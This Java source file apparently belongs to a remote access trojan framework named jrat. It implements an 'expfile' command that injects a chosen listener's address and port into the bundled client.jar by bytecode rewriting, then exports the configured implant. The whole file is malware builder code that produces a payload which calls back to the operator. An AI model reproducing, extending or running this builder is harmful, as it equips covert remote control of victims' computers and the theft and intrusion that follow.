package net.jrat.core.command.commands;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.inject.Injector;
import net.jrat.core.inject.JarHandler;
import net.jrat.core.listener.Listener;
import net.jrat.utils.Variables;

public class ExportFile extends Command
{
	public ExportFile()
	{
		super("expfile", new String[] { "listener" }, new String[] { "sets the listener" }, "exports the executable file into working directory");
	}
	
	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		final String listenerName = commandLine.getOptionValue("listener", null);
		
		if(listenerName == null)
			throw new Exception("listener is needed");
		
		final Listener listener = this.server.listenerManager.getListener(listenerName);
		
		if(listener == null)
			throw new Exception("listener not found");
		
		final File input = new File(Variables.instance.workDir + "assets" + File.separator + "client.jar");
		
		if(!(input.exists()))
			throw new Exception("client jar not found. try to reinstall jrat");
		
		{
			final Injector injector = new Injector(input.getAbsolutePath(), "net.jrat.utils.Variables")
			{
				@Override
				public void setup()
				{
					try
					{
						this.insertAfter("create", "this.address = \"" + listener.address + "\";");
						this.insertAfter("create", "this.port = " + listener.port + ";");
					}
					catch(Exception e) {}
				}
			};
			
			final HashMap<String, byte[]> classes = new HashMap<String, byte[]>();
			classes.put("net/jrat/utils/Variables.class", injector.getBytecode());
			injector.close();
			
			final File output = new File(Variables.instance.workDir + "client.jar");
			
			Files.copy(Paths.get(input.getAbsolutePath()), Paths.get(output.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);
			new JarHandler().applyInjection(output, classes);
		}
	}
}